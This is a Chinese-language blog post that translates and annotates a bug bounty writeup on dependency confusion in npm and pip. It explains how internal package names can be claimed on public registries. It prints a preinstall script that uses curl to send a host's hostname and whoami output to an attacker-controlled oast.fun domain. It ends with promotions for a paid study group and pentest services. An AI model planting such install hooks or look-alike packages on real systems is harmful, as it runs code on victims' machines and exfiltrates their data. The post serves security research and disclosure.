#  【海外SRC赏金挖掘】供应链攻击，通过依赖投毒实现RCE（Dependency Confusion 漏洞）   
原创 fkalis  fkalis   2024-09-19 22:57  
  
# 海外SRC赏金挖掘专栏  
> **在学习SRC，漏洞挖掘，外网打点，渗透测试，攻防打点等的过程中，我很喜欢看一些国外的漏洞报告，总能通过国外的赏金大牛，黑客分享中学习到很多东西，有的是一些新的信息收集方式，又或者是一些骚思路,骚姿势，又或者是苛刻环境的漏洞利用。于是我打算开启这个专栏，将我认为优秀的文章进行翻译，加入我的理解和笔记，方便我自己学习和各位师傅共同进步，我争取做到日更，如果各位师傅觉得有用的话，可以给我点个关注~~ 如果师傅们有什么好的建议也欢迎联系我~~ 感谢各位师傅的支持~~**  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicdYMrcDj1IM8qV6I0rkpibO7pTY4CibicHmG6uHuL0eiasl9l6xI2MDRZaKhicsPUAdzslV95G055uvHibw/640?wx_fmt=png&from=appmsg "")  
# 正文部分  
## 声明  
> **本教程只用于学习和研究Dependency Confusion 漏洞，请不要在没有授权的情况下对网站进行非法测试，请不要进行非法投毒！！！**  
  
## 什么是依赖混淆漏洞？  
  
**依赖项混淆（Dependency Confusion）**  
  
****  
是一种软件供应链漏洞，当公司的内部包错误地从公共存储库（如 npm）而不是其私有注册表下载时，就会发生这种漏洞。  
如果包管理器（如 npm、pip 或其他）默认从公共源拉取，并且那里存在同名的包，则可能会发生这种情况。  
  
在依赖项混淆攻击中，攻击者可以创建与公司内部包同名的恶意包，并将其发布到公共注册表。如果公司的系统从公共注册表中解析包，他们可能会下载并执行攻击者的代码，从而导致远程代码执行 （RCE） 等安全风险。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/OlNJlSSibBicex6KWnS85zblEIcHo0xG4syxFSgE5Ic7otHn813GAM25uF0FzibkzbqYVURLK2icXQjKKZoRtNCtGQ/640?wx_fmt=other&from=appmsg "null")  
## 为什么会产生这种漏洞  
> **这和服务器主要是新包库的安装的来源优先级有关，当私有库和公有库都存在的情况下，是优先私有库，或者是优先共有库，又或者是谁的版本优先级高就选择哪个，这都和服务器的更新配置还有使用的参数有关，使用不当的优先级，可能就会导致依赖的投毒**  
  
  
例如：在最早发现的 Dependency Confusion 国外师傅   
**Alex Birsan**  
   
就发现了 pip 会导致依赖项混淆的原因是因为使用了**--extra-index-url ，**  
当使用了这个参数后，pip 下载就会准寻以下的原则  
- • 检查指定的（内部）包索  
引上是否存在这个库  
  
- • 检查公共包索引 （PyPI） 上是否存在这个库  
  
- • 安装找到的任何版本。如果这两个版本都包含该软件包，则默认从版本号较高的源进行安装。  
  
**在这种情况下，我们尝试在pip公共索引中上传一个他引用了的内部包库，并且将版本设置的很高，就会导致代码进行引用更新的时候会安装到我们上传到公共索引的恶意代码**  
## 漏洞利用基本流程（略）  
  
不知道会不会有风险，没有在公众号进行详细流程的讲解，在内部小圈子进行展示.....  
## 实例  
> https://bugcrowd.com/Polyxena  
  
  
### 发现依赖  
  
在一次参与过程中，我检查了该公司的一个 JavaScript 文件，并注意到它引用了存储在 中的Node.js包 。这表明该公司正在使用内部 npm 包。我检查了这个内部包是否已在公共 npm 注册表上发布，我发现它在 npm 上**未被认领**。/node_modules/@confidential-package-name  
  
这种未认领状态表明，任何人都可以创建具有相同名称的包，并通过诱骗公司的系统从公共 npm 注册表而不是其内部源代码下载和执行代码，从而可能导致**依赖项混淆**问题。  
### 漏洞利用  
  
我使用与内部包相同的名称创建了一个恶意 npm 包。然后，我将此包发布到公共 npm 注册表，嵌入了一个perinstall脚本，该脚本旨在在安装时自动执行。@confidential-package-name  
  
perinstall 脚本简单但有效：  
```
"preinstall": "curl --data-urlencode \"info=$(hostname && whoami)\" http://<攻击者控制的域>.oast.fun"
```  
  
他可以很好的将目标的host发送给我们，用于确定受害者的域名，以及代码执行whoami进行漏洞的验证  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/OlNJlSSibBicex6KWnS85zblEIcHo0xG4seNI8rnviau1sUDkxlia0rtxJ300dxqDwcia9lKwPHFzsCTrtg6PouEibow/640?wx_fmt=other&from=appmsg "null")  
  
package.json  
  
此脚本会将安装包的服务器的主机名和用户信息发送到我控制下的域。一旦包在 npm 上上线，我就耐心等待，在几个小时到几天内，我开始收到来自公司**生产和非生产环境**的多个请求，确认他们的系统正在下载和执行恶意包。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/OlNJlSSibBicex6KWnS85zblEIcHo0xG4sghpxHMzqfuq7b2ZwYLRibkAaCZ8RR0vDXagda5HG2MYVHicduTsgPITA/640?wx_fmt=other&from=appmsg "null")  
  
这些请求包括主机名和用户名等详细信息，为了解哪些环境受到依赖关系混淆攻击的影响提供了宝贵的见解。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/OlNJlSSibBicex6KWnS85zblEIcHo0xG4sicFrhhp6bR91PbYpQ1qKibIW5XuicTCkibrYPvCkPvHG9Rr9xx0aef4icPA/640?wx_fmt=other&from=appmsg "null")  
  
受控主机上收到 150 多次 HTTP 和 DNS 查询后，我开始分析 IP 地址和从中检索到的数据。我通过过滤掉已知的爬虫程序来策划列表，然后对所有剩余的 IP 进行 WHOIS 查找，以检查是否有任何 IP 与公司的 IP 范围或其服务提供商匹配。  
  
一周内，报告被接受了。获得了 2,500 美元的赏金，这是此特定计划的最高奖励。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/OlNJlSSibBicex6KWnS85zblEIcHo0xG4sVXEicX0C3Qe6yLdibdbRibVkZrJdTxzdK1gg6Lhcon6y5kvybYcg9ianmg/640?wx_fmt=other&from=appmsg "null")  
  
# 知识星球  
  
**具体的星球介绍可以看一下这里~~**  
  
[WingBy小密圈，他来了！](https://mp.weixin.qq.com/s?__biz=MzkyODcwOTA4NA==&mid=2247484765&idx=1&sn=01366a5d13fb4be7f9c0e69e565d64ff&chksm=c215e5eef5626cf8c87fcca7d784068772d364a12aa4b4a224aebd1e69bddf52fec0f791d000&token=276602823&lang=zh_CN&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicdYMrcDj1IM8qV6I0rkpibO7lPF38IqibU9Az906W6RHJBQhf2OR32Ks7sd8Xh4ric0VFRNR2lXmFwKA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/OlNJlSSibBicdCvkAftp00C0F9g6uLYXGnpAWQmOBwrqRUI6V26tvWqFJib6PmZO9fiaY0nia2An9JmtL5mMibqIAH5w/640?wx_fmt=jpeg&from=appmsg "null")  
  
**注意：帮会和星球是为了考虑大家的方便习惯，福利和内容是一致的，后续更新也是一致的~~~只需要进行一次付费就可以啦~~（建议还是使用帮会）**![](https://mmbiz.qpic.cn/mmbiz_jpg/OlNJlSSibBicf197vbRopEgYNZjbmJ00wHzicThAsLt7xehsSWC5JKY3NSEMkWbGolb0oSJmLlQlqHTic5bVyFgeBg/640?wx_fmt=jpeg&from=appmsg "")  
  
  
# 项目合作  
  
  
**有甲方大大，或者厂商师傅，或者其他的项目，欢迎咨询，我以及团队始终将客户的需求放在首位，确保客户满意度~~**  
  
****  
**目前主要的服务范围：**  
****  
> **1. 渗透测试、漏洞扫描**  
  
**2. 代码审计**  
  
**3. 红蓝攻防**  
  
**4. 重保以及其他攻防类项目**  
  
**5. 红队武器化开发以及蓝队工具开发**  
  
**6. CTF相关赛事的培训等**  
  
**7. cnvd，cnnvd，edu，cve等证书**  
  
**8. nisp，cisp等证书**  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicdYMrcDj1IM8qV6I0rkpibO7ZJRQaUkzj4SdzlE2LemzRDG7yrl4rP4cFunhhibibX3CzGEPwFQzqIkw/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
